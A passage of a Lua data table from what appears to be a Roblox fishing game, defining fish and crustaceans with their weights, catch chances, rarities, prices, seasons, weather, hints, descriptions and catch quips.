			Hint = "Found in Vertigo.";
			FavouriteBait = "Truffle Worm";
			FavouriteTime = nil;
			Price = 450;
			XP = 400;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear",
				"Windy"
			};
			Quips = {
				"I caught a Voidfin Mahi!",
				"Woah, a Voidfin Mahi!!",
				"It's a Voidfin Mahi!"
			};
			SparkleColor = Color3.fromRGB(83, 67, 106);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Vertigo"
		};Chinfish = {
			WeightPool = {
				20,
				40
			};
			Chance = 70;
			Rarity = "Uncommon";
			Resilience = 80;
			Description = "The Chinfish is a peculiar species with a distinct chin-like protrusion on its lower jaw. They are sluiggish swimmers and are an interesting catch to have on the otherside of your line.";
			Hint = "Caught near Sunstone Island.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 85;
			XP = 40;
			Seasons = {
				"Autumn",
				"Winter"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"Woah, a Chinfish!",
				"The Megachin!",
				"I caught a Chinfish!",
				"It's a Chinfish!"
			};
			SparkleColor = Color3.fromRGB(214, 214, 214);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Sunstone"
		};Napoleonfish = {
			WeightPool = {
				250,
				350
			};
			Chance = 19;
			Rarity = "Rare";
			Resilience = 40;
			Description = "The Napoleonfish, also known as the Humphead Wrasse, is a large and brightly colored fish with a distinctive bump on its forehead. Despite its size, it is surprisingly agile, making it a thrilling challenge for anglers.";
			Hint = "Found easier in the outer waters of Sunstone Island during the day.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 200;
			XP = 100;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"A Napoleonfish!",
				"I caught a Napoleonfish!",
				"Woahh, a Napoleonfish!"
			};
			SparkleColor = Color3.fromRGB(90, 255, 195);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Sunstone"
		};Crab = {
			WeightPool = {
				6,
				14
			};
			Chance = 40;
			Rarity = "Uncommon";
			Resilience = 90;
			Description = "Crabs are cute crustaceans that search the ocean floor for food. They can be found in plenty of ocean regions. Be careful, some can have harshly strong claws.";
			Hint = "Can be caught while cage fishing in open oceans.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 100;
			XP = 50;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Crusty Crab!",
				"Woah! A Crab",
				"Awesome!",
				"A Crab!",
				"Ou! A Crab!"
			};
			SparkleColor = Color3.fromRGB(209, 90, 90);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Coelacanth = {
			WeightPool = {
				70,
				100
			};
			Chance = 14;
			Rarity = "Rare";
			Resilience = 40;
			Description = "The Coelacanth is an ancient fish with a distinctive shape and strong swimming behaviors. Known as a 'living fossil,' this fish was thought to be extinct until its rediscovery in 1938. Coelacanths are deep-sea dwellers, often found in underwater caves and steep slopes.";
			Hint = "Found in the Deep Ocean.";
			FavouriteBait = "None";
			FavouriteTime = "Night";
			Price = 370;
			XP = 300;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Woah, a Coelacanth!",
				"I caught a Coelacanth!",
				"It's a Coelacanth!",
				"Nice! It's a Coelacanth!"
			};
			SparkleColor = Color3.fromRGB(76, 76, 76);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};["Mushgrove Crab"] = {
			WeightPool = {
				6,
				14
			};
			Chance = 14;
			Rarity = "Rare";
			Resilience = 90;
			Description = "The Mushgrove Crab is a rare species of crab. They have fully adapted to the Mushgrove Swamp and commonly eat off of the massive fungal life that has over taken the swamp.";
			Hint = "Can be caught while cage fishing in mushgrove.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 330;
			XP = 80;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Crusty Mushgrove Crab!",
				"Woah! A Mushgrove Crab",
				"Awesome!",
				"A Mushgrove Crab!",
				"Ou! A Mushgrove Crab!"
			};
			SparkleColor = Color3.fromRGB(185, 56, 52);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Mushgrove"
		};["Swamp Scallop"] = {
			WeightPool = {
				6,
				14
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 90;
			Description = "Swamp Scallops are a special kind of Scallops with a rich umami taste. They formed from an invasive growth of the Scallop population in Mushgrove Swamp.";
			Hint = "Can be caught while cage fishing in mushgrove.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 150;
			XP = 40;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Swamp Scallop!",
				"Woah! A Swamp Scallop",
				"Awesome!",
				"A Swamp Scallop!",
				"Ou! A Swamp Scallop!"
			};
			SparkleColor = Color3.fromRGB(142, 185, 78);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Mushgrove"
		};Scallop = {
			WeightPool = {
				2,
				5
			};
			Chance = 40;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "Scallops are known for their ability to 'swim' by rapidly opening and closing their shells, which propels them through the water. They can be found best in sandy or grass filled areas of the ocean.";
			Hint = "Best caught in sandy or grass filled areas of the ocean.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 100;
			XP = 40;
			Seasons = {
				"Winter",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Scallop!",
				"Woah! A Scallop",
				"Awesome!",
				"A Scallop!",
				"Ou! A Scallop!"
			};
			SparkleColor = Color3.fromRGB(255, 195, 135);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};["Sand Dollar"] = {
			WeightPool = {
				1,
				2
			};
			Chance = 55;
			Rarity = "Common";
			Resilience = 200;
			Description = "Sand dollars are species of flat, burrowing sea urchins.. Yeah, they are urchins! Fun fact; The rattling of a fossilized Sand Dollar is their teeth-like sections moving around inside of them.";
			Hint = "Can be easily caught while cage fishing. Best caught near docks and beaches.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 20;
			XP = 35;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Sand Dollar!",
				"Woah! A Sand Dollar",
				"Awesome!",
				"A Sand Dollar!",
				"Ou! A Sand Dollar!"
			};
			SparkleColor = Color3.fromRGB(255, 227, 143);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Mussel = {
			WeightPool = {
				1,
				2
			};
			Chance = 55;
			Rarity = "Common";
			Resilience = 200;
			Description = "Mussels are small mollusc that can be easily found on rocks, near beaches, and near docks. They actually have one food and have very limited movement, so most mussels stay in one place their entire lives.. thats boring!";
			Hint = "Can be easily caught while cage fishing. Best caught near docks and beaches.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 20;
			XP = 35;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Mussel!",
				"Woah! A Mussel",
				"Awesome!",
				"A Mussel!",
				"Ou! A Mussel!"
			};
			SparkleColor = Color3.fromRGB(53, 53, 89);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Oyster = {
			WeightPool = {
				2,
				5
			};
			Chance = 50;
			Rarity = "Uncommon";
			Resilience = 95;
			Description = "Oysters are bivalve mollusks with rough, irregularly shaped shells. They are typically found in clusters, attached to submerged rocks and roots. They can be found all over Terapin Islands; The Oysters help filter the water of Terrapin, leaving making it nearly a freshwater island.";
			Hint = "Can be easily caught while cage fishing. Best caught near large rocks and all over Terrapin Island.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 30;
			XP = 35;
			Seasons = {
				"Summer",
				"autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"An Oyster!",
				"Woah! An Oyster",
				"Awesome!",
				"An Oyster!",
				"Ou! An Oyster!"
			};
			SparkleColor = Color3.fromRGB(217, 194, 168);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};["King Oyster"] = {
			WeightPool = {
				4,
				10
			};
			Chance = 20;
			Rarity = "Rare";
			Resilience = 95;
			Description = "King Oysters are a special breed of oysters that can only be found around Terrapin Island. They filter almost all salt out of the water, making Terrapins water freshwater.";
			Hint = "Can be easily caught while cage fishing. Only found near Terrapin Island.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 200;
			XP = 35;
			Seasons = {
				"Summer",
				"autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"An Oyster!",
				"Woah! A King Oyster",
				"Awesome!",
				"A King Oyster!",
				"Ou! A King Oyster!"
			};
			SparkleColor = Color3.fromRGB(217, 215, 151);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};["Sea Urchin"] = {
			WeightPool = {
				2,
				9
			};
			Chance = 15;
			Rarity = "Rare";
			Resilience = 200;
			Description = "Sea Urchins are spiny, globular animals. Their hard shells are round and spiny. They use their spikes along with their tube feet to push themselves along the ocean terrain. Sea Urchins can be caught in any climate and traditionally only prefer sea water.";
			Hint = "Can be rarely caught while cage fishing, especially in the ocean.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 320;
			XP = 80;
			Seasons = {
				"None"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Sea Urchin!",
				"I caught a Sea Urchin!",
				"Woah, an Urchin!"
			};
			SparkleColor = Color3.fromRGB(34, 32, 42);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Shrimp = {
			WeightPool = {
				1,
				2
			};
			Chance = 45;
			Rarity = "Common";
			Resilience = 200;
			Description = "Shrimp are small, versatile crustaceans that are most active from spring to autumn, and can be found in an abundance in deep oceans. Shrimp are predominantly nocturnal, making night fishing the most effective time.";
			Hint = "Caught at night in deep oceans in crab cages.";
			FavouriteBait = "None";
			FavouriteTime = "Night";
			Price = 45;
			XP = 35;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Shrimp!",
				"Woah! A Shrimp",
				"Awesome!",
				"A Shrimp!",
				"Ou! A Shrimpy!"
			};
			SparkleColor = Color3.fromRGB(255, 107, 96);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};["Night Shrimp"] = {
			WeightPool = {
				1,
				2
			};
			Chance = 45;
			Rarity = "Common";
			Resilience = 200;
			Description = "Night Shrimp are small, versatile crustaceans that can be found in an abundance in Vertigo's calm water. night Shrimp are predominantly diurnal, making day fishing the most effective time.";
			Hint = "Caught with crab cages in Vertigo.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 55;
			XP = 35;
			Seasons = {
				"Summer",
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Night Shrimp!",
				"Woah! A Night Shrimp",
				"Awesome!",
				"A Night Shrimp!",
				"Ou! A Night Shrimpy!"
			};
			SparkleColor = Color3.fromRGB(49, 51, 74);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Vertigo"
		};Prawn = {
			WeightPool = {
				1,
				5
			};
			Chance = 40;
			Rarity = "Uncommon";
			Resilience = 200;
			Description = "Prawns are prized crustaceans known for their delicate flavor and versatility. they are most active in summer, and can be found in an abundance in deep oceans. Prawns; similar to shrimp-- are predominantly nocturnal, making night fishing the most effective time.";
			Hint = "Caught at night in deep oceans in crab cages.";
			FavouriteBait = "None";
			FavouriteTime = "Night";
			Price = 45;
			XP = 35;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Prawn!",
				"Woah! A Prawn",
				"Awesome!",
				"A Prawn!",
				"Ou! A Prawn!"
			};
			SparkleColor = Color3.fromRGB(165, 255, 248);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Lobster = {
			WeightPool = {
				9,
				28
			};
			Chance = 30;
			Rarity = "Unusual";
			Resilience = 200;
			Description = "Lobsters are valuable crustaceans known for their rich, succulent meat. Lobsters are most active in the summer to autumn, and are commonly caught in crab cages during calm clear days.";
			Hint = "Caught in oceans using a crab cage.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 130;
			XP = 60;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Larry Lobster!",
				"Woah! A Lobster",
				"Awesome!",
				"A Lobster!",
				"Ou! A Lobster!"
			};
			SparkleColor = Color3.fromRGB(255, 57, 57);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Pike = {
			WeightPool = {
				12,
				35
			};
			Chance = 45;
			Rarity = "Unusual";
			Resilience = 55;
			Description = "Pikes are a freshwater predator known for its elongated body, sharp teeth, and aggressive hunting behavior. It's a voracious carnivore that preys on smaller fish, frogs, and even small mammals near the water's edge. Pikes have a unique ability to ambush their prey by remaining almost motionless in the water, then striking with incredible speed to catch their meal.";
			Hint = "Found in Moosewoods freshwater. Seems to prefer insect baits. Very vicious.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 230;
			XP = 90;
			Seasons = {
				"Autumn",
				"Spring"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Pike!",
				"I caught a Pike!",
				"Woah! a Pike!",
				"PIKE!!!",
				"I'd prefer a lance.",
				"A Pike?!",
				"That's a big Pike!"
			};
			SparkleColor = Color3.fromRGB(93, 140, 109);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};["Glacier Pike"] = {
			WeightPool = {
				12,
				35
			};
			Chance = 45;
			Rarity = "Unusual";
			Resilience = 55;
			Description = "Pikes are a long, predatory freshwater fish known for its aggressive nature and sharp teeth. Glacier Pikes are supremely found in cold freshwaters in Snowcap Island. They can be determained by their unique ice-coloured scales and longer fins.";
			Hint = "Found in Snowcaps freshwater. Seems to prefer insect baits.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 230;
			XP = 90;
			Seasons = {
				"Autumn",
				"Spring"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Glacier Pike!",
				"I caught a Glacier Pike!",
				"Woah! a Glacier Pike!",
				"GLACIER PIKE!!!",
				"I'd prefer a lance.",
				"A Glacier Pike?!",
				"That's a big Glacier Pike!"
			};
			SparkleColor = Color3.fromRGB(93, 140, 109);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Eel = {
			WeightPool = {
				8,
				45
			};
			Chance = 30;
			Rarity = "Unusual";
			Resilience = 65;
			Description = "Eels are a long snake-like, ray-finned fish that is primarily nocturnal. They have a keen sense of smell and can be harmful to humans due to their strong jaws with sharp teeth. Some eels also contain toxins that will destroy red blood cells. Eels move in an interesting way due to them not having pelvic or pectoral fins. To swim, eels generate waves that travel the length of their body, animating them similar to snakes.";
			Hint = "Only comes out at night. Can be found in all kinds of habitats near Moosewood.";
			FavouriteBait = "None";
			FavouriteTime = "Night";
			Price = 130;
			XP = 90;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Is it a snake?",
				"An Eel!",
				"I think some slime got on me.",
				"Woah! An Eel!",
				"H-eel-lo!",
				"An Eel! Things just got REAL!"
			};
			SparkleColor = Color3.fromRGB(255, 233, 226);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};["Ember Snapper"] = {
			WeightPool = {
				60,
				120
			};
			Chance = 50;
			Rarity = "Unusual";
			Resilience = 40;
			Description = "The Ember Snapper is a lava swimming fish with a resemblance to the salt water 'Red Snapper'. The Ember Snapper is acute in volcanic habitats due to their thick skin and strong dorsal fins.";
			Hint = "Found in volcanic regions.";
			FavouriteBait = "Coal";
			FavouriteTime = nil;
			Price = 200;
			XP = 120;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"An Ember Snapper!",
				"Woah! I caught an Ember Snapper!",
				"I caught an Ember Snapper!",
				"Ember Snapper!!!"
			};
			SparkleColor = Color3.fromRGB(191, 39, 25);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit Volcano"
		};["Ember Perch"] = {
			WeightPool = {
				4,
				15
			};
			Chance = 80;
			Rarity = "Unusual";
			Resilience = 40;
			Description = "The Ember Perch is a lava swimming fish with a resemblance to the fresh water 'Perch'. The Ember Perch is acute in volcanic habitats due to their thick skin and ability to turn coal and carbon into a food source.";
			Hint = "Found in volcanic regions.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 160;
			XP = 100;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"An Ember Perch!",
				"I caught a Perch!.. Why is it so hot?",
				"Woah, a Perch! Why is it on fire?",
				"Aww! An Ember Perch!",
				"Woah! An Ember Perch!"
			};
			SparkleColor = Color3.fromRGB(255, 19, 19);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit Volcano"
		};Squid = {
			WeightPool = {
				5,
				25
			};
			Chance = 25;
			Rarity = "Unusual";
			Resilience = 45;
			Description = "Squids can be found best at night in the surrounding ocean of Roslit Bay. Squids are rapid swimmers and largelt locate their prey by sight. Squids are extremely intellegent and can even hunt in cooperative groups.";
			Hint = "Best found at night in ocean near Roslit Bay.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Night";
			Price = 140;
			XP = 95;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Squid!",
				"A cute Squid!",
				"I caught a Squid!"
			};
			SparkleColor = Color3.fromRGB(255, 173, 102);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["Ribbon Eel"] = {
			WeightPool = {
				5,
				150
			};
			Chance = 12;
			Rarity = "Unusual";
			Resilience = 30;
			Description = "The ribbon eel is a striking and elusive reef fish known for its vibrant blue or green body and long, ribbon-like appearance. While they are rare, the Ribbon Eel can be best found in the coral reef of Roslit Bay";
			Hint = "Only comes out at night. Can be found inside the coral reef of Roslit Bay.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 150;
			XP = 150;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Is it a snake?",
				"A Ribbon Eel!",
				"I think some slime got on me.",
				"Woah! A Ribbon Eel!",
				"H-eel-lo! Ribbon Eel!"
			};
			SparkleColor = Color3.fromRGB(70, 141, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit"
		};["Chinook Salmon"] = {
			WeightPool = {
				100,
				400
			};
			Chance = 30;
			Rarity = "Unusual";
			Resilience = 50;
			Description = "The Chinook Salmon, also known as King Salmon, are large silver fish with a slightly forked tail and a black mouth. They are highely prized; and are a common target for sport and commercial fishing. The King Salmon are commonly in ocean waters, but during the Autumn they migrate to Terrapin Island to lay eggs.";
			Hint = "Found in the waters of Terrapin Island, and general ocean waters.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 230;
			XP = 100;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ou! A Chinook Salmon!",
				"A King Salmon!",
				"I Caught a King Salmon!",
				"Woah, a King Salmon!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Terrapin"
		};Sturgeon = {
			WeightPool = {
				200,
				800
			};
			Chance = 20;
			Rarity = "Rare";
			Resilience = 35;
			Description = "A massive, ancient fish with a long, armored body and distinctive bony plates. Sturgeons are known for their size and strength, making them challenging to catch.";
			Hint = "found in Snowcap Pond.";
			FavouriteBait = "Seaweed";
			FavouriteTime = nil;
			Price = 300;
			XP = 100;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Sturgeon!",
				"I AMM.. I AMM A STURGEON!!",
				"I caught a Sturgeon Fish!",
				"A Sturgeon!!",
				"Woahh a Sturgeon!"
			};
			SparkleColor = Color3.fromRGB(232, 232, 232);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};["Bull Shark"] = {
			WeightPool = {
				900,
				1300
			};
			Chance = 0.3;
			Rarity = "Legendary";
			Resilience = 20;
			Description = "Bull sharks have robust bodies, and an extremely powerful nature. They have a special ability to adapt to both saltwater and freshwater, which is quite rare for sharks. Bull Sharks can be found most commonly near coats, and in freshwaters.";
			Hint = "Found roaming in all types of waters and on the coasts.";
			FavouriteBait = "Fish Head";
			FavouriteTime = nil;
			Price = 400;
			XP = 150;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Rain",
				"Foggy"
			};
			Quips = {
				"A Bull Shark!",
				"Thats some Bull Shark!",
				"I caught a Bull Shark!"
			};
			SparkleColor = Color3.fromRGB(255, 245, 197);
			HoldAnimation = L_58_:WaitForChild("heavybasic");
			From = "Ocean"
		};["Suckermouth Catfish"] = {
			WeightPool = {
				95,
				170
			};
			Chance = 35;
			Rarity = "Rare";
			Resilience = 60;
			Description = "The Suckermouth Catfish is a tropical freshwater fish found on the ground and near the seaweed of Roslits Bays pond. They are easily notable for their large armour like scutes covering their upper parts of the head and body.";
			Hint = "Found best near seaweed of Roslit Bays pond.";
			FavouriteBait = "Seaweed";
			FavouriteTime = "Day";
			Price = 160;
			XP = 80;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Suckermouth Catfish!",
				"I caught a Catfish!",
				"Woah, a Suckermouth!"
			};
			SparkleColor = Color3.fromRGB(158, 128, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit"
		};Pyrogrub = {
			WeightPool = {
				300,
				600
			};
			Chance = 25;
			Rarity = "Rare";
			Resilience = 25;
			ProgressEfficiency = 0.8;
			Description = "The Pyrogrub is a fearsome, lava swimming eel that thrives in the most volcanic of environments. The Pyrogrub sports thick dragon-like scales which allow it's inner body to not react to any form of outside temperature.";
			Hint = "Found in volcanic regions.";
			FavouriteBait = "Coal";
			FavouriteTime = nil;
			Price = 340;
			XP = 120;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Pyrogrub!",
				"I caught a Pyrogrub!",
				"Woah, a Pyrogrub!",
				"What the?!"
			};
			SparkleColor = Color3.fromRGB(255, 151, 46);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit Volcano"
		};Anglerfish = {
			WeightPool = {
				5,
				20
			};
			Chance = 12;
			Rarity = "Rare";
			Resilience = 35;
			Description = "The anglerfish is a deep-sea predator known for it's bioluminescent lure that dangles in front of its mouth to attract prey. With its menacing appearance, sharp teeth, and eerie glow, the Anglerfish thrives in dark, deep waters, making it a rare and exciting catch in the Deep Ocean.";
			Hint = "Found in the far, deep ocean during the night.";
			FavouriteBait = "Squid";
			FavouriteTime = "Night";
			Price = 230;
			XP = 100;
			Seasons = {
				"Winter",
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"Woah, an Anglerfish!",
				"No way! An anglerfish!",
				"I caught an Anglerfish!"
			};
			SparkleColor = Color3.fromRGB(182, 25, 25);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "Ocean"
		};["Keepers Guardian"] = {
			WeightPool = {
				200,
				400
			};
			Chance = 15;
			Rarity = "Rare";
			Resilience = 25;
			Description = "Whilst it is named the 'Keepers Guardian', they are actually friendly creatures! The Guardian can sense peoples intentions, and will only become violent when they notice someone with a harmful intention to it or the Keepers Altar.";
			Hint = "Found in Keepers Altar.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 250;
			XP = 120;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Keepers Guardian!",
				"I caught a Keepers Guardian!",
				"Woah, a Keepers Guardian!",
				"What the?! A Keepers Guardian?!"
			};
			SparkleColor = Color3.fromRGB(56, 53, 134);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Keepers Altar"
		};Pufferfish = {
			WeightPool = {
				5,
				20
			};
			Chance = 12;
			Rarity = "Rare";
			Resilience = 65;
			Description = "Pufferfish are clumsy swimmers that can fill their elastic stomachs with huge amounts of water & air to blow themselves up to several times their normal size. They do this to evade and scare of predators. On top of their bloating abilities, they also are one of the most poisonous fish in the sea... Also they are the only bony fish which can close their eyes!";
			Hint = "Found in reefs and deepwaters.";
			FavouriteBait = "Seaweed";
			FavouriteTime = nil;
			Price = 230;
			XP = 100;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah! a Blowfish!",
				"A Pufferfish!",
				"A Water Balloon!",
				"Woah, A Pufferfish!"
			};
			SparkleColor = Color3.fromRGB(255, 227, 15);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "Ocean"
		};Swordfish = {
			WeightPool = {
				1000,
				2500
			};
			Chance = 15;
			Rarity = "Rare";
			Resilience = 35;
			Description = "Swordfish are extremely strong and notable due to their long flattened bill that resembles a sword, as their name implies. They are a great catch, and anglers around the globe are impressed by a Swordfish catch.";
			Hint = "Found in deep ocean water. Extremely strong.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 850;
			XP = 300;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Windy",
				"Clear"
			};
			Quips = {
				"A Swordfish!",
				"WOAH! A Swordfish!!",
				"SWORDFISHHHH",
				"I caught a swordfish!!"
			};
			SparkleColor = Color3.fromRGB(93, 128, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			ViewportSizeOffset = 0.9;
			From = "Ocean"
		};Sailfish = {
			WeightPool = {
				400,
				600
			};
			Chance = 16;
			Rarity = "Rare";
			Resilience = 40;
			Description = "Sailfish are known for their incredible speed, long bill, and their striking sail-like dorsal fin. It's sleek body is built for fast swiming, allowing it to dart through water in bursts of speed. They are found in tropical and warmer ocean waters.";
			Hint = "Found in ocean water. Extremely strong.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 800;
			XP = 300;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Windy",
				"Clear"
			};
			Quips = {
				"A Sailfish!",
				"WOAH! A Sailfish!!",
				"It's a Sailfish!",
				"I caught a Sailfish!!"
			};
			SparkleColor = Color3.fromRGB(255, 242, 94);
			HoldAnimation = L_58_:WaitForChild("heavybasic");
			ViewportSizeOffset = 0.9;
			From = "Ocean"
		};Alligator = {
			WeightPool = {
				1500,
				3000
			};
			Chance = 0.9;
			Rarity = "Legendary";
			Resilience = 15;
			ProgressEfficiency = 0.8;
			Description = "The Alligator is a massive, fearsome reptile known for its powerful bite and armored body. Found in Mushgrove Swamp, Alligators are the apex predator with a stealthy and ambush-based hunting style.";
			Hint = "Found in Mushgrove Swamp during the night.";
			FavouriteBait = "Fish Head";
			FavouriteTime = "Night";
			Price = 700;
			XP = 400;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Foggy, Rain"
			};
			Quips = {
				"WOAH!!",
				"OH MY GOD!!",
				"AN ALLIGATOR!",
				"WHAT????"
			};
			SparkleColor = Color3.fromRGB(153, 255, 116);
			HoldAnimation = L_58_:WaitForChild("heavybasic");
			From = "Mushgrove"
		};["Obsidian Salmon"] = {
			WeightPool = {
				40,
				180
			};
			Chance = 3;
			Rarity = "Legendary";
			Resilience = 15;
			ProgressEfficiency = 0.9;
			Description = "The Obsidian Salmon is an extremely rare breed of Sockeye Salmon. The Obsidian Salmon breeds extremely deep in the heart of Roslit Volcano. They are extremely strong and are double as dense as a common Sockeye Salmon.";
			Hint = "???";
			FavouriteBait = "Coal";
			FavouriteTime = "Night";
			Price = 600;
			XP = 300;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Obsidian Salmoff!",
				"Woah! An Obsidian Salmon!",
				"Awesome! An Obsidian Salmon",
				"An Obsidian Salmon!",
				"Woah, An Obsidian Salmon!",
				"A Salmon!..? Made of obsidian?"
			};
			SparkleColor = Color3.fromRGB(102, 0, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit Volcano"
		};["Manta Ray"] = {
			WeightPool = {
				7750,
				10000
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 10;
			ProgressEfficiency = 0.9;
			Description = "Manta Rays are very elegant and remarkably large creatures that coast alongside the coral reefs of Roslit Bay. They move their wing-like fins in a wavy motion to generate enough speed to guide through the ocean. Manta Rays typically feed on small fish during the night.";
			Hint = "Found gliding through Roslit Bays coral reef during the night.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Night";
			Price = 3000;
			XP = 1000;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"WOAH.. A Manta Ray!",
				"I caught a Manta Ray!",
				"Woah.. A Manta Ray!!"
			};
			SparkleColor = Color3.fromRGB(87, 118, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Roslit"
		};["Obsidian Swordfish"] = {
			WeightPool = {
				1000,
				2500
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 20;
			ProgressEfficiency = 0.8;
			Description = "Swordfish are extremely strong and notable due to their long flattened bill that resembles a sword, as their name implies. This swordfish has adapted to it's magma filled life, and is now imbued with Obsidian skin.";
			Hint = "???";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 2500;
			XP = 1000;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Windy",
				"Clear"
			};
			Quips = {
				"An Obsidian Swordfish!",
				"WOAH! An Obsidian Swordfish!!",
				"OBSIDIANNN SWORDFISHHHH",
				"I caught an Obsidian Swordfish!!"
			};
			SparkleColor = Color3.fromRGB(176, 79, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			ViewportSizeOffset = 0.9;
			From = "Roslit Volcano"
		};["Golden Smallmouth Bass"] = {
			WeightPool = {
				15,
				45
			};
			Chance = 3;
			Rarity = "Legendary";
